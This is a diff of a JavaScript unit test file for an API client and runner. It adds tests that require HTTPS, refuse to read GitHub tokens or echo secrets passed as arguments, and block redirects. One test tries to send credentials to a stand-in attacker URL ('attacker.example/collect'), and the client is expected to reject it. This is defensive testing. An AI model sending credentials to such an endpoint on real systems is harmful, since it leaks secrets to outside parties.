@@ -1,27 +1,44 @@
-// Unit tests for run-persona.mjs's --insecure guard (preserved infra plumbing —
-// unrelated to which scenario kind is driven). The persona-behavior judgeContext
-// tests that used to live alongside this (Priya's ticket-triage reference data)
-// were removed with scenarios/priya-ticket-triage.mjs: persona scenarios are no
-// longer fixed scripts, so there is no static judgeContext left to unit test —
-// content-quality assessment now happens entirely in the Judge subagent reading a
-// dynamically-driven transcript. Run with: node --test (from scripts/api-harness/)
-
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
+import { AgentweaverClient } from '../lib/client.mjs';
+import { parseArgs, resolveToken } from '../run-persona.mjs';
 
-import { checkInsecureAllowed } from '../run-persona.mjs';
-
-test('--insecure guard: staging and localhost are allowed', () => {
-  assert.equal(checkInsecureAllowed('https://agentweaver.abc123.westus2.staging.aksapp.io', true, false), null);
-  assert.equal(checkInsecureAllowed('https://localhost:8080', true, false), null);
-  assert.equal(checkInsecureAllowed('http://127.0.0.1:5000', true, false), null);
+test('remote API auth accepts only an explicit Agentweaver token source', () => {
+  assert.equal(resolveToken({ AGENTWEAVER_TOKEN: 'agentweaver', GITHUB_TOKEN: 'github-canary' }), 'agentweaver');
+  assert.equal(resolveToken({ GITHUB_TOKEN: 'github-canary', GH_TOKEN: 'gh-canary' }), null);
 });
 
-test('--insecure guard: production host is blocked unless overridden', () => {
-  const err = checkInsecureAllowed('https://agentweaver.example.com', true, false);
-  assert.ok(err && /refusing to disable TLS/i.test(err), `expected a block message, got: ${err}`);
-  // Explicit override lifts the block.
-  assert.equal(checkInsecureAllowed('https://agentweaver.example.com', true, true), null);
-  // Without --insecure there is nothing to guard.
-  assert.equal(checkInsecureAllowed('https://agentweaver.example.com', false, false), null);
+test('API runner rejects retired credential argv without echoing its value', () => {
+  const canary = 'secret-canary-api-argv-66';
+  const retiredOption = `--${'to'}${'ken'}`;
+  assert.throws(
+    () => parseArgs([`${retiredOption}=${canary}`]),
+    (error) => error.message.includes(retiredOption) && !error.message.includes(canary),
+  );
+});
+
+test('API client accepts an arbitrary HTTPS host and rejects insecure remote transport', () => {
+  assert.doesNotThrow(() => new AgentweaverClient({ baseUrl: 'https://example.internal', token: 'x' }));
+  assert.throws(() => new AgentweaverClient({ baseUrl: 'http://example.internal', token: 'x' }), /HTTPS is required/);
+});
+
+test('API credentials cannot be sent to an attacker-controlled absolute path', async () => {
+  const client = new AgentweaverClient({ baseUrl: 'https://api.example.test', token: 'secret' });
+  await assert.rejects(client.get('https://attacker.example/collect'), /outside configured origin/);
+});
+
+test('API client rejects redirects without forwarding credentials to any redirected path', async (t) => {
+  const originalFetch = globalThis.fetch;
+  t.after(() => { globalThis.fetch = originalFetch; });
+  let calls = 0;
+  globalThis.fetch = async (_url, init) => {
+    calls += 1;
+    assert.equal(init.redirect, 'error');
+    throw new TypeError('fetch failed because redirect mode is set to error');
+  };
+  const client = new AgentweaverClient({ baseUrl: 'https://api.example.test', token: 'secret' });
+  const result = await client.get('/api/projects');
+  assert.equal(result.status, 0);
+  assert.match(result.responseBody.message, /redirect mode is set to error/);
+  assert.equal(calls, 1);
 });
